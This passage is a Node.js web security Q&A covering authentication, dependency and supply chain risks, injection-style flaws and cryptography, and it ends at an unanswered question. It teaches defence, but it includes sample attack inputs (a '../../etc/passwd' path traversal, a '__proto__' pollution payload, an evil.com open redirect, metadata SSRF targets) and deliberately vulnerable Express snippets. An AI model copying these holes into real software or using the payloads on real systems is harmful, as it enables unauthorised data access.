## 51: What is OAuth 2.0?

OAuth 2.0 is a protocol for delegated authorization. It lets a user give an app limited access to their data on another service without sharing their password. For example, "let this app read my GitHub repos".

The app redirects the user to the authorization server, the user logs in and agrees, and the app gets an access token. OAuth by itself is about authorization. Login ("Sign in with Google") is built on top of it with OpenID Connect.

## 52: What is OpenID Connect?

OpenID Connect (OIDC) is an identity layer on top of OAuth 2.0. Besides the access token, the provider returns an ID token, a signed JWT that says who the user is (`sub`, `email`, `name`, `iss`, `aud`, `exp`).

It's what you use for "Sign in with Google/Microsoft/Apple" and for company single sign-on with providers like Okta, Auth0, Entra ID or Keycloak.

## 53: What is an API key and when do you use one?

An API key is a long random string that identifies the calling application or account. It's common for server-to-server calls and public APIs, for example a customer calling your API from their back end.

API keys are not tied to a user session and often live a long time, so treat them like passwords: show them once, store only a hash, allow rotation and revocation, and give each key only the permissions it needs.

## 54: What is the principle of least privilege?

Every user, service and process should get only the permissions it needs to do its job, and nothing more.

For a Node app that means: don't run as root, give the database user only the tables and operations it needs, give the cloud IAM role access only to the buckets it uses, and give each API key the smallest scope. When something gets compromised, the damage is smaller.

## 55: What is defense in depth?

Defense in depth means using several layers of protection, so if one fails the others still help. For example, against XSS you encode output, sanitize HTML, set a CSP and make cookies `HttpOnly`. Against data leaks you have access checks, encryption at rest, network rules and monitoring.

No single control is perfect, so you don't depend on just one.

## 56: Why shouldn't you run a Node.js app as root?

If the app is compromised (command injection, a malicious dependency, an RCE bug), the attacker gets the same rights as the process. As root they can read any file, install software, change system config and in containers it can make escaping to the host easier.

Run as a normal user. The official Node Docker images include a `node` user:

```dockerfile
USER node
```

If you need port 80 or 443, put a proxy in front or map the port, don't run as root.

## 57: What is a dependency vulnerability?

It's a security bug in a package you use, directly or indirectly. A typical Node app has hundreds or thousands of packages in `node_modules`, most of them indirect (dependencies of dependencies). A bug in any of them can affect your app.

Known vulnerabilities get a CVE or GitHub advisory ID, and tools like `npm audit`, Dependabot, Snyk or Socket warn you when you use an affected version.

## 58: What does npm audit do?

`npm audit` checks your installed dependency tree against the GitHub Advisory Database and lists packages with known vulnerabilities, their severity and how to fix them.

```bash
npm audit
npm audit --omit=dev       # only production dependencies
npm audit fix              # upgrade within allowed ranges
npm audit --audit-level=high  # fail CI only for high and critical
```

Not every finding is exploitable in your app, so read them instead of blindly running `npm audit fix --force`, which can install breaking major versions.

## 59: Why should you commit package-lock.json?

The lockfile records the exact version and integrity hash of every package in the tree. With it, every developer, CI run and production build installs the same code.

Without it, a new install can silently pull a newer version of some indirect dependency, including a compromised one. The integrity hashes also make sure the downloaded tarball is the one that was locked.

## 60: What is the difference between npm install and npm ci?

`npm install` reads `package.json`, can update the lockfile and may install newer versions within the allowed ranges.

`npm ci` deletes `node_modules`, installs exactly what the lockfile says, and fails if the lockfile and `package.json` don't match. Use `npm ci` in CI and in Docker builds, so you get repeatable and verified installs.

## 61: What is a supply chain attack?

A supply chain attack targets something you depend on instead of your code directly: an npm package, a build tool, a CI action, a Docker base image. The attacker puts malicious code into it, and every project that installs it runs that code.

In the npm world this has happened many times, for example `event-stream` in 2018, `ua-parser-js` in 2021, and in 2025 the compromise of popular packages like `chalk` and `debug` through a phishing attack and the self-spreading "Shai-Hulud" worm.

## 62: What is typosquatting?

Typosquatting is publishing a malicious package with a name close to a popular one, like `expres`, `lodahs` or `cross-env.js`, hoping developers mistype the name. Some attackers also publish names that AI coding tools tend to make up ("slopsquatting").

Double-check package names before installing, look at the download count, repo link and publish date, and use tools like Socket that flag suspicious packages.

## 63: What are npm install scripts and why are they risky?

Packages can define `preinstall`, `install` and `postinstall` scripts that run automatically during `npm install`. Many malware packages use them to steal environment variables, SSH keys and tokens the moment they're installed, before you even run your app.

You can turn them off:

```bash
npm ci --ignore-scripts
```

pnpm v10 and later doesn't run dependency build scripts unless you approve the package.

## 64: Why should you keep Node.js updated?

Node.js itself gets security fixes regularly, for things like HTTP parsing, TLS, the permission model and path handling. Fixes are only released for supported versions.

Use an LTS version that is still supported (Active or Maintenance LTS), and update to the latest patch release, especially after a security release announcement. Old versions that reached end of life get no fixes at all.

## 65: What is an LTS version of Node.js?

LTS means Long Term Support. Until Node 26, even-numbered releases became LTS and got fixes for about 30 months, while odd-numbered releases were short-lived. Starting with Node 27, the project moves to one major release per year (in April) and every release becomes LTS in October.

For production, use a supported LTS version. Check the official release schedule for end-of-life dates.

## 66: What is NODE_ENV=production and does it affect security?

`NODE_ENV=production` is a convention that many libraries read. Express, for example, stops sending stack traces in its default error handler and enables view caching. Some libraries turn off debug features.

It's not a security feature by itself, but forgetting it can leak stack traces and internal details. Also don't make security checks depend on it, like "skip auth when not production", because config mistakes happen.

## 67: Why shouldn't you show stack traces to users?

Stack traces reveal file paths, library names and versions, SQL queries, internal hostnames and sometimes data. All of this helps an attacker understand and target your system.

Log the full error on the server and return a generic message with an ID that support can look up:

```js
app.use((err, req, res, next) => {
  const id = crypto.randomUUID();
  logger.error({ err, id }, "Unhandled error");
  res.status(500).json({ error: "Something went wrong", id });
});
```

## 68: What should you never write to logs?

Passwords, password hashes, full credit card numbers, CVV codes, session IDs, JWTs, API keys, refresh tokens, private keys, and usually full personal data like ID numbers or health info.

Logs are copied to many places (log services, backups, developer laptops) and are often less protected than the database. Use your logger's redaction feature for headers like `authorization` and `cookie`.

## 69: What is path traversal?

Path traversal is when user input is used to build a file path and the attacker uses `../` to get out of the intended folder.

```js
// Vulnerable: GET /files?name=../../etc/passwd
app.get("/files", (req, res) => {
  res.sendFile(path.join(__dirname, "uploads", req.query.name));
});
```

The attacker can read config files, source code or secrets on the server.

## 70: How do you prevent path traversal?

Resolve the full path and check that it's still inside the folder you allow. Better still, don't use user input as a file name at all. Store files under generated IDs and look them up in a database.

```js
import path from "node:path";

const base = path.resolve("uploads");
const target = path.resolve(base, req.query.name);

if (!target.startsWith(base + path.sep)) {
  return res.status(400).end();
}
res.sendFile(target);
```

Express's `res.sendFile` also has a `root` option that blocks paths going above it.

## 71: What are the main risks of file uploads?

- Uploading a script (for example `.html`, `.svg` or `.js`) that gets served back and runs in the browser.
- Huge files that fill the disk or memory.
- Files with a fake extension or MIME type.
- Path traversal in the file name.
- Malware passed on to other users.
- Exploits in image or document parsers.

Limit size, check the real file type from its content, generate your own names, store files outside the web root (or in object storage like S3), and serve them with `Content-Disposition: attachment` or from a separate domain.

## 72: How do you limit upload size with multer?

```js
import multer from "multer";

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024, files: 1 },
  fileFilter: (req, file, cb) => {
    cb(null, ["image/png", "image/jpeg"].includes(file.mimetype));
  },
});

app.post("/avatar", upload.single("avatar"), handler);
```

Note that `file.mimetype` comes from the client and can be faked, so also check the file's real content (magic bytes) with a package like `file-type`.

## 73: Why should you limit the request body size?

If the server accepts any body size, an attacker can send huge bodies to use up memory and CPU and slow down or crash the process. Express's built-in parsers have a default limit of 100kb. Set it on purpose for each route type:

```js
app.use(express.json({ limit: "100kb" }));
app.use(express.urlencoded({ extended: false, limit: "50kb" }));
```

Upload routes can have bigger limits, but only on those routes.

## 74: What is a denial of service (DoS) attack?

A DoS attack tries to make a service unavailable. It can flood the server with traffic, send requests that are very expensive to handle, or exploit a bug that crashes the process. A DDoS uses many machines at once.

Node is especially sensitive to anything that blocks the single main thread, like a slow regular expression, a huge JSON parse or a synchronous crypto call.

## 75: Why is blocking the event loop a security problem?

Node runs your JavaScript on one main thread. If one request does heavy synchronous work (a big loop, `JSON.parse` on a 50 MB body, a slow regex, `bcrypt.hashSync`), no other request is processed until it finishes.

An attacker who finds such a request can send a few of them and freeze the whole server. This makes event loop blocking a DoS risk, not just a performance problem.

## 76: What is ReDoS?

ReDoS (Regular expression Denial of Service) happens when a regex has nested or overlapping repeats like `(a+)+$` or `(\w+\s?)*$`. On certain inputs the regex engine tries a huge number of combinations, and matching can take seconds or minutes.

Since JavaScript regex runs on the main thread, one bad input can block the whole Node process. Avoid nested quantifiers, limit input length, and test regexes with tools like `safe-regex2` or `recheck`.

## 77: What is prototype pollution?

Prototype pollution is when an attacker manages to add or change properties on `Object.prototype`. Since almost every object inherits from it, the new property shows up everywhere.

```js
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
naiveDeepMerge({}, payload);
({}).isAdmin; // true
```

It usually comes from unsafe deep merge, clone or "set by path" functions. It can lead to auth bypass, crashes, and sometimes remote code execution.

## 78: What is eval() and why is it dangerous?

`eval()` runs a string as JavaScript code. If any part of that string comes from the user, the attacker can run any code in your process, with access to `process.env`, the file system and the network.

The same goes for `new Function(...)`, `setTimeout("string")`, and `vm.runInNewContext` with user input. You almost never need them. Use `JSON.parse` for data, and a lookup table instead of building code.

## 79: What is security misconfiguration?

It's when the software is fine but set up in an unsafe way. Examples: debug mode in production, default passwords, open S3 buckets, CORS allowing any origin with credentials, verbose error messages, an exposed `--inspect` port, an admin panel open to the internet, or missing security headers.

It's one of the most common causes of real breaches. Infrastructure as code, config reviews and automated scans help catch it.

## 80: What is an IDOR?

IDOR (Insecure Direct Object Reference) is when the server uses an ID from the request to load data and doesn't check if the current user may access it.

```js
// Vulnerable: any logged-in user can read any invoice
app.get("/invoices/:id", auth, async (req, res) => {
  res.json(await Invoice.findById(req.params.id));
});
```

The fix is to always scope the query to the user, for example `Invoice.findOne({ _id: req.params.id, userId: req.user.id })`.

## 81: Do random UUIDs fix IDOR?

No. They make IDs harder to guess, which helps a bit, but IDs leak all the time: in URLs, logs, shared links, emails, browser history and other API responses. Once an attacker sees an ID, they can use it.

Unguessable IDs are a nice extra layer, but the real fix is an authorization check on every request.

## 82: What is role-based access control (RBAC)?

RBAC gives permissions to roles (like `admin`, `editor`, `viewer`) and gives roles to users. The code checks the role or, better, the permission that the role includes.

```js
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({ error: "Forbidden" });
    }
    next();
  };
}

app.delete("/posts/:id", auth, requireRole("admin", "editor"), deletePost);
```

## 83: What is the difference between 401 and 403?

`401 Unauthorized` means the request has no valid authentication. The user isn't logged in, or the token is missing, expired or invalid.

`403 Forbidden` means the server knows who you are, but you're not allowed to do this.

Sometimes APIs return `404` instead of `403` for resources the user can't see, so they don't reveal that the resource exists.

## 84: What is user enumeration?

User enumeration is when an attacker can find out which usernames or emails are registered, because the app responds differently. For example, "wrong password" vs "user not found", or "email already in use" on signup, or a faster response time when the user doesn't exist.

It helps credential stuffing and phishing. Use the same message ("Invalid email or password") and similar response times, and for password reset always say "If an account exists, we sent an email".

## 85: How should a password reset flow work?

1. User enters their email. Always respond with the same message.
2. If the account exists, generate a random token (`crypto.randomBytes(32)`), store only its hash with a short expiry (for example 30 minutes), and email a link with the token.
3. When the link is used, hash the token, find it, check expiry, and let the user set a new password.
4. Delete the token after use (single use), and log out other sessions.
5. Notify the user that their password was changed.

## 86: What makes a good password policy today?

Current guidance (NIST SP 800-63B) is:

- Minimum length of at least 8, ideally 12-15 or more, and allow long passwords (64+ characters).
- No forced mix of character types and no forced regular changes.
- Allow all characters, including spaces and emoji.
- Check new passwords against lists of breached and common passwords.
- Allow paste so password managers work.
- Rate limit login attempts and support MFA.

## 87: What is session fixation?

Session fixation is when an attacker makes the victim use a session ID the attacker already knows, for example by planting a cookie. After the victim logs in, the attacker uses the same ID and is logged in too.

The fix is to create a new session ID at login (and on privilege changes). In `express-session`:

```js
req.session.regenerate((err) => {
  if (err) return next(err);
  req.session.userId = user.id;
  res.redirect("/");
});
```

## 88: How do you log a user out properly?

With server sessions, destroy the session on the server and clear the cookie:

```js
req.session.destroy(() => {
  res.clearCookie("sid");
  res.sendStatus(204);
});
```

With JWTs, delete the tokens on the client, and revoke the refresh token on the server. The access token stays valid until it expires, which is why it should be short-lived. Offer "log out of all devices" too.

## 89: What is express-session?

`express-session` is the standard session middleware for Express. It creates a session ID, sets it in a signed cookie and stores session data in a store.

```js
import session from "express-session";

app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    name: "sid",
    cookie: { httpOnly: true, secure: true, sameSite: "lax", maxAge: 86400000 },
    store: redisStore,
  }),
);
```

The default memory store leaks memory and isn't shared between instances, so use Redis or a database store in production.

## 90: What is trust proxy in Express and why does it matter?

When Express runs behind a load balancer, the client IP and protocol come from headers like `X-Forwarded-For` and `X-Forwarded-Proto`. `app.set("trust proxy", ...)` tells Express which proxies to trust for these headers.

If it's off, `req.ip` is the proxy's IP (rate limiting treats everyone as one user) and `req.secure` is false. If it's `true` without a proxy in front, clients can fake their IP with a header. Set it to the exact number of proxies or their IPs:

```js
app.set("trust proxy", 1);
```

## 91: What is SSRF?

SSRF (Server-Side Request Forgery) is when the server makes an HTTP request to a URL the user controls. The attacker uses your server to reach things they can't reach directly, like `http://localhost:6379`, internal admin services, or the cloud metadata endpoint `http://169.254.169.254`, which can return cloud credentials.

Features that fetch URLs (link previews, webhooks, "import from URL", image proxies, PDF renderers) are typical places for SSRF.

## 92: What is an open redirect?

An open redirect is an endpoint that redirects to any URL from a parameter, like `/login?next=https://evil.com`. Attackers use your trusted domain in phishing links, and in OAuth flows it can help steal tokens.

Only redirect to relative paths or to an allowlist of hosts:

```js
const next = req.query.next;
const safe =
  typeof next === "string" &&
  next.startsWith("/") &&
  !next.startsWith("//") &&
  !next.includes("\\");
res.redirect(safe ? next : "/");
```

## 93: What is the difference between encoding, encryption and hashing?

- **Encoding** (base64, URL encoding, HTML entities) changes the format of data so it can be safely transported or displayed. Anyone can decode it. It's not security.
- **Encryption** hides data using a key. Only someone with the key can read it.
- **Hashing** makes a one-way fingerprint of data. It can't be reversed.

A common mistake is to think base64 "hides" data. It doesn't.

## 94: What is symmetric vs asymmetric encryption?

Symmetric encryption uses the same key to encrypt and decrypt (AES). It's fast and good for data at rest and bulk data.

Asymmetric encryption uses a key pair: a public key and a private key (RSA, elliptic curves). Data encrypted with the public key can only be decrypted with the private key, and signatures made with the private key can be checked with the public key. TLS uses both: asymmetric crypto to agree on keys, then symmetric crypto for the data.

## 95: What is HMAC?

HMAC (Hash-based Message Authentication Code) combines a secret key with a hash function to produce a signature. Only someone with the key can produce a valid HMAC for a message, so it proves the message came from someone with the key and wasn't changed.

It's used for webhook signatures, signed cookies, HS256 JWTs and API request signing.

```js
import { createHmac } from "node:crypto";

const sig = createHmac("sha256", secret).update(body).digest("hex");
```

## 96: What is a timing attack?

A timing attack learns a secret by measuring how long the server takes to respond. A normal string comparison (`===`) stops at the first different character, so comparing a guessed token with the real one takes slightly longer when more characters match.

For secrets like tokens, HMAC signatures and API keys, use a constant-time comparison.

## 97: How do you compare secrets safely in Node.js?

Use `crypto.timingSafeEqual`. It needs two buffers of the same length, so check the length first.

```js
import { timingSafeEqual } from "node:crypto";

function safeEqual(a, b) {
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) return false;
  return timingSafeEqual(bufA, bufB);
}
```

An even simpler trick is to hash both values with SHA-256 first, so the buffers always have the same length.

## 98: What is a secret manager?

A secret manager is a service that stores secrets (database passwords, API keys, certificates) encrypted, controls who can read them, logs access and helps rotate them. Examples are AWS Secrets Manager, Google Secret Manager, Azure Key Vault, HashiCorp Vault, Doppler and 1Password.

The app gets its secrets at startup or at runtime through an IAM role, instead of keeping them in files or code.

## 99: What is secret rotation?

Rotation means replacing a secret with a new one on a schedule or after a possible leak. If an old key leaked without anyone noticing, rotation limits how long it can be used.

The app should be able to handle rotation without downtime, for example by accepting both the old and the new key for a short time.

## 100: What is a CVE?

A CVE (Common Vulnerabilities and Exposures) ID is a unique identifier for a publicly known vulnerability, like `CVE-2024-27980`. It helps everyone talk about the same bug. A CVSS score (0-10) usually comes with it to show how severe it is.

Node.js security releases, npm advisories and tools like `npm audit` all refer to CVE or GHSA (GitHub Security Advisory) IDs.

## 101: How do you find out about Node.js security releases?

- The Node.js blog posts security release announcements a few days before the fix, with the affected versions and severity.
- The `nodejs-sec` Google group and the Node.js security page.
- GitHub advisories for npm packages, surfaced through `npm audit`, Dependabot or Snyk.

Plan to update within days for high-severity issues that affect features you use.

## 102: What is Dependabot?

Dependabot is a GitHub feature that watches your dependencies. It sends alerts when a package you use has a known vulnerability, and it can open pull requests to update dependencies (security updates and regular version updates).

Renovate is a popular alternative with more config options. Both are only useful if someone reviews and merges the PRs, and CI tests catch breaking changes.

## 103: What is a lockfile integrity hash?

Each entry in `package-lock.json` has an `integrity` field like `sha512-...`. It's a hash of the package tarball. When npm downloads the package, it checks the hash, and if it doesn't match, the install fails.

This protects against a tarball being changed in transit or on a mirror. It doesn't protect you if the version itself was malicious when you locked it.

## 104: What are devDependencies and why does it matter for security?

`devDependencies` are packages needed only for development and building (test tools, bundlers, linters). With `npm ci --omit=dev` they're not installed in production.

That makes the production image smaller and reduces the attack surface, because fewer packages are present at runtime. Dev dependencies still run on developer machines and CI, so they can still steal secrets there.

## 105: What is the difference between vulnerability, threat and risk?

- **Vulnerability:** a weakness, like a missing auth check.
- **Threat:** someone or something that could exploit it, like an attacker scanning your API.
- **Risk:** how likely it is to be exploited and how bad the result would be.

You use risk to decide what to fix first. A critical bug in an internal-only tool may be less urgent than a medium bug in your login endpoint.

## 106: What is an attack surface?

The attack surface is everything an attacker can interact with: public endpoints, admin panels, file uploads, WebSocket servers, open ports, third-party integrations, dependencies, CI pipelines and the people with access.

Reducing it is one of the easiest wins: remove unused endpoints and packages, don't expose debug or metrics ports to the internet, and close admin tools behind a VPN or SSO.

## 107: What is the same-origin policy?

The same-origin policy is a browser rule that a page can only read data from the same origin (scheme + host + port). `https://app.com` can't read responses from `https://api.other.com` with JavaScript unless that server allows it with CORS.

It's what keeps a random site from reading your Gmail when you're logged in. Note that it limits reading, not sending. A cross-site form post is still sent, which is why CSRF exists.

## 108: What is the SameSite cookie attribute?

`SameSite` controls whether the browser sends a cookie on cross-site requests.

- `Strict`: never sent on cross-site requests, even when following a link.
- `Lax`: sent on top-level navigations with safe methods (like clicking a link), not on cross-site POSTs, iframes or fetch. Modern browsers use this as the default when nothing is set.
- `None`: always sent. Requires `Secure`.

`Lax` is a good default for session cookies.

## 109: What are signed cookies?

A signed cookie has an HMAC attached, so the server can tell if the client changed its value. `cookie-parser` supports it:

```js
app.use(cookieParser(process.env.COOKIE_SECRET));
res.cookie("theme", "dark", { signed: true });
req.signedCookies.theme;
```

Signing doesn't hide the value. The client can still read it. If the content is private, encrypt it, or store it on the server and keep only an ID in the cookie.

## 110: Should you put sensitive data in a JWT payload?

No. The payload is only base64url-encoded, so anyone with the token can read it, for example on jwt.io. Put only what the server needs to identify and authorize the user, like the user ID, roles and expiry.

If you really need private data inside a token, use an encrypted JWT (JWE), but usually it's simpler to look the data up on the server.

## 111: What is the exp claim in a JWT?

`exp` is the expiration time, a Unix timestamp in seconds. After that time, `jwt.verify` rejects the token. Other time claims are `iat` (issued at) and `nbf` (not before).

Every token should have an `exp`. Without it, a stolen token works forever.

## 112: What are the iss and aud claims for?

`iss` (issuer) says who created the token, and `aud` (audience) says who it's meant for. Checking both prevents a token issued by another service, or for another API, from being accepted by yours.

```js
jwt.verify(token, publicKey, {
  algorithms: ["RS256"],
  issuer: "https://auth.example.com",
  audience: "orders-api",
});
```

## 113: What is the difference between HS256 and RS256?

HS256 uses HMAC with one shared secret. The same secret signs and verifies, so every service that verifies tokens can also create them.

RS256 uses RSA with a key pair. The auth server signs with the private key, and other services verify with the public key, so they can't create tokens. ES256 (elliptic curve) and EdDSA work the same way with smaller keys. Use asymmetric algorithms when several services verify tokens.

## 114: What is a JWKS?

A JWKS (JSON Web Key Set) is a JSON document with public keys, usually served at a URL like `https://auth.example.com/.well-known/jwks.json`. Each key has a `kid` (key ID). The token header says which `kid` signed it, and the API picks the matching key to verify.

It makes key rotation easy: the auth server adds a new key, starts signing with it, and later removes the old one.

```js
import { createRemoteJWKSet, jwtVerify } from "jose";

const JWKS = createRemoteJWKSet(
  new URL("https://auth.example.com/.well-known/jwks.json"),
);
const { payload } = await jwtVerify(token, JWKS, {
  issuer: "https://auth.example.com",
  audience: "orders-api",
});
```

## 115: What is TOTP?

TOTP (Time-based One-Time Password) is the 6-digit code from apps like Google Authenticator or Authy. The server and the app share a secret, and both compute a code from the secret and the current 30-second time window.

On the server you store the secret (encrypted), check the code with a small time window allowance, rate limit attempts, and don't accept the same code twice. Libraries like `otplib` do the math.

## 116: What is account lockout and what is the downside?

Account lockout blocks an account after a number of failed logins, for example 10. It stops online password guessing against one account.

The downside is that an attacker can lock out real users on purpose (a DoS on accounts). Softer options are increasing delays, temporary locks, CAPTCHA after a few failures, and limits per IP and per account.

## 117: What is a CAPTCHA and when do you use it?

A CAPTCHA is a challenge that's easy for humans and hard for bots. Modern ones like Cloudflare Turnstile, hCaptcha or reCAPTCHA often run invisibly and only show a challenge when traffic looks suspicious.

Use it on signup, login after failures, password reset and contact forms. Always verify the CAPTCHA token on the server, not just in the browser.

## 118: What is input sanitization and how is it different from validation?

Validation checks if input is acceptable and rejects it if not. Sanitization changes input to make it safe, for example removing HTML tags or trimming whitespace.

Prefer validation (reject bad input) whenever possible. Use sanitization for cases where you must accept rich content, like HTML from a text editor. And remember that output encoding is still needed where the data ends up (HTML, SQL, shell).

## 119: What is output encoding?

Output encoding converts characters to a safe form for the place where data is used. In HTML, `<` becomes `&lt;`. In a URL, a space becomes `%20`. In JavaScript strings, quotes get escaped.

The right encoding depends on context, which is why you let your template engine do it instead of writing your own. The same string may be safe in an HTML body and unsafe inside a `<script>` or an `href`.

## 120: Why is it risky to use JSON.parse on untrusted input?

`JSON.parse` doesn't run code, so it's much safer than `eval`. But there are still risks:

- Big inputs block the event loop while parsing.
- The result may have unexpected types (an object where you expect a string), which leads to NoSQL injection or crashes.
- Keys like `__proto__` can cause prototype pollution later if you merge the result into other objects.
- Invalid JSON throws, so you need `try/catch`.

Limit body size and validate the parsed result with a schema.

## 121: What is the difference between Buffer.alloc and Buffer.allocUnsafe?

`Buffer.alloc(size)` returns memory filled with zeros. `Buffer.allocUnsafe(size)` returns memory that isn't cleared, so it can contain old data from the process, like other users' requests or keys.

`allocUnsafe` is faster, but if you send the buffer without filling all of it, you can leak memory contents. Use `Buffer.alloc` unless you are sure you overwrite every byte. The old `new Buffer()` constructor is deprecated for this reason.

## 122: Why shouldn't you swallow uncaught exceptions and keep running?

After an `uncaughtException`, the process may be in a broken state: half-finished operations, open locks, corrupted data in memory. Continuing can give wrong results or open security holes.

Log the error, stop accepting new requests, and let the process exit so the process manager or orchestrator restarts it.

```js
process.on("uncaughtException", (err) => {
  logger.fatal({ err }, "Uncaught exception");
  process.exit(1);
});
```

## 123: What is security logging?

Security logging means recording events that matter for detecting and investigating attacks: logins (successful and failed), password and MFA changes, permission changes, access denied events, admin actions, rate limit hits, and validation failures on sensitive endpoints.

Each entry should have a timestamp, user ID, IP, request ID and outcome, but not secrets. Logs should go to a central place where they can be searched and where alerts can be set up.

## 124: What is structured logging and why use it?

Structured logging writes each log line as JSON with fields instead of free text. It's easier to search, filter and build alerts on, for example "failed logins per IP in the last 5 minutes".

Pino is a popular fast logger for Node and has built-in redaction:

```js
import pino from "pino";

const logger = pino({
  redact: ["req.headers.authorization", "req.headers.cookie", "*.password"],
});
```

## 125: What is a security header scanner?

A tool that checks your site's response headers and tells you what's missing or wrong, for example Mozilla HTTP Observatory or securityheaders.com. They check CSP, HSTS, `X-Content-Type-Options`, frame options, cookies and more.

They're a fast way to spot missing basics, but a good grade doesn't mean the app is secure.

## 126: What is the Referrer-Policy header?

When a user follows a link or the page loads a resource, the browser may send the current URL in the `Referer` header. If URLs contain tokens or private paths, they can leak to third parties.

`Referrer-Policy: strict-origin-when-cross-origin` (the browser default today) sends only the origin to other sites. `no-referrer` (what Helmet sets) sends nothing.

## 127: What is the Permissions-Policy header?

`Permissions-Policy` lets you turn off browser features your site doesn't use, like camera, microphone, geolocation or payment, for your pages and embedded iframes.

```
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

If an attacker injects code, they can't use those features. Helmet doesn't set it by default, so add it yourself if you need it.

## 128: What is the Cache-Control header's role in security?

Responses with private data (account pages, API responses with personal info) shouldn't be stored by shared caches like CDNs or proxies, or in the browser cache on shared computers.

```
Cache-Control: no-store
```

Public static assets can be cached. A wrong cache setting on a CDN can serve one user's private page to other users.

## 129: What is HTTP Basic authentication and is it safe?

Basic auth sends `Authorization: Basic base64(username:password)` on every request. Base64 is not encryption, so it's only acceptable over HTTPS.

It's fine for simple internal tools or machine-to-machine calls, but it has no logout, no MFA and sends the password every time. For user-facing apps, use sessions or tokens.

## 130: What is a bearer token?

A bearer token is a token sent in the `Authorization: Bearer <token>` header. "Bearer" means whoever holds it can use it, like cash. There's no extra proof the sender is the owner.

That's why bearer tokens should be sent only over HTTPS, be short-lived, never be put in URLs (they end up in logs and history), and be stored carefully.

## 131: Why should you not put tokens in URLs?

URLs are saved in browser history, server and proxy access logs, analytics tools, and can be sent in the `Referer` header to other sites. A token in a URL is very likely to leak.

Send tokens in headers or cookies. The exception is short-lived one-time tokens in email links (password reset, email verification), which should expire fast and work only once.

## 132: What is the difference between encryption in transit and at rest?

Encryption in transit protects data while it moves over the network (TLS/HTTPS). Encryption at rest protects data stored on disk (database files, backups, S3 objects).

Most managed databases and cloud storage offer encryption at rest with one setting. It protects against stolen disks or backups, but not against someone who can query the database through the app, so you still need access control.

## 133: How do you encrypt data with AES in Node.js?

Use AES-256-GCM. It encrypts and also detects tampering.

```js
import { randomBytes, createCipheriv, createDecipheriv } from "node:crypto";

const key = Buffer.from(process.env.DATA_KEY, "base64"); // 32 bytes

function encrypt(text) {
  const iv = randomBytes(12);
  const cipher = createCipheriv("aes-256-gcm", key, iv);
  const data = Buffer.concat([cipher.update(text, "utf8"), cipher.final()]);
  return Buffer.concat([iv, cipher.getAuthTag(), data]).toString("base64");
}

function decrypt(b64) {
  const buf = Buffer.from(b64, "base64");
  const decipher = createDecipheriv("aes-256-gcm", key, buf.subarray(0, 12));
  decipher.setAuthTag(buf.subarray(12, 28));
  return Buffer.concat([
    decipher.update(buf.subarray(28)),
    decipher.final(),
  ]).toString("utf8");
}
```

Never reuse an IV with the same key.

## 134: What is a security vulnerability disclosure policy?

It tells security researchers how to report vulnerabilities to you and what to expect: where to send reports, response times, and that you won't take legal action against good-faith research. Some companies also run bug bounties.

You can publish contact info in a `/.well-known/security.txt` file. For open source projects, GitHub's private vulnerability reporting works well.

## 135: What is the security.txt file?

`security.txt` is a standard (RFC 9116) text file at `/.well-known/security.txt` that tells researchers how to report security issues.

```
Contact: mailto:security@example.com
Expires: 2027-12-31T23:59:59.000Z
Policy: https://example.com/security-policy
```

## 136: What is the risk of exposing the Node.js inspector?

`node --inspect` opens a debugging port (9229 by default). Anyone who can connect to it can run any code inside your process. By default it listens on `127.0.0.1`, but `--inspect=0.0.0.0` exposes it to the network.

Never run with `--inspect` open in production. If you need to debug, bind to localhost and use an SSH tunnel or `kubectl port-forward`.

## 137: What is the risk of using outdated or abandoned packages?

Abandoned packages don't get security fixes. When a vulnerability is found, nobody publishes a patch. Old packages may also depend on old vulnerable packages, and an abandoned package name can sometimes be taken over by a new, malicious maintainer.

Check activity before adding a package, prefer well-maintained ones, and remove packages you don't need anymore. Sometimes Node has a built-in replacement now (`fetch`, `crypto.randomUUID`, `structuredClone`, `node:test`, `util.parseArgs`).

## 138: How do you check if a package is trustworthy before installing it?

- Look at the repository, recent commits and open issues.
- Check weekly downloads and how long it has existed.
- Check the maintainers and whether it has provenance (shown on the npm page).
- Look at what it depends on and whether it has install scripts.
- Look for strange things: a new version after years of nothing, obfuscated code, network calls in install scripts.
- Use tools like Socket, Snyk Advisor or OpenSSF Scorecard.

## 139: What is a reverse proxy and how does it help security?

A reverse proxy (Nginx, HAProxy, Envoy, a cloud load balancer) sits in front of your Node app. It can terminate TLS, enforce request size and timeout limits, block slow clients, rate limit, filter bad requests, hide internal servers, and add security headers.

Node can do some of this, but a proxy is battle-tested for handling raw internet traffic.

## 140: What is a WAF?

A WAF (Web Application Firewall) inspects HTTP traffic and blocks requests that look like attacks, such as common SQL injection or XSS patterns, known bad bots, or requests to known vulnerable paths. Examples are Cloudflare WAF, AWS WAF and ModSecurity.

A WAF is a useful extra layer and can block exploits for known CVEs quickly, but it can be bypassed, so it doesn't replace secure code.

## 141: What is two-factor bypass through a recovery flow?

Even if login requires MFA, attackers look for other ways in: a password reset that logs the user in without MFA, an email change that doesn't require MFA, support staff who disable MFA after a phone call, or backup codes that never expire.

All paths to an account must be as strong as the main login.

## 142: What is a refresh token rotation?

Refresh token rotation means every time a refresh token is used, the server issues a new refresh token and invalidates the old one. If an old token is used again, it means someone stole it, so the server revokes the whole token family and forces a new login.

This limits how long a stolen refresh token is useful.

## 143: What is the difference between stateful and stateless authentication?

Stateful authentication (server sessions) keeps session data on the server. The client only has an ID. It's easy to revoke: delete the session.

Stateless authentication (JWT) puts the data in a signed token. The server doesn't need to look anything up, which helps with scaling, but revoking a token before it expires needs extra work, like a deny list or short expiry.

## 144: What does "never trust the client" mean in practice?

Anything coming from the browser or a mobile app can be changed: hidden form fields, prices, user IDs, roles, disabled buttons, client-side validation, headers like `X-User-Id`, and even the JavaScript code itself.

The server must recompute prices, check permissions and validate input on its own, as if the request came from an attacker.

## 145: What is mass assignment?

Mass assignment is when you pass the whole request body into a database create or update.

```js
// Vulnerable: body = { "name": "Bob", "role": "admin" }
await User.updateOne({ _id: req.user.id }, req.body);
```

The attacker sets fields they shouldn't, like `role`, `isVerified` or `balance`. Pick the allowed fields explicitly or use a schema that strips unknown keys.

## 146: What is the X-Forwarded-For header and can you trust it?

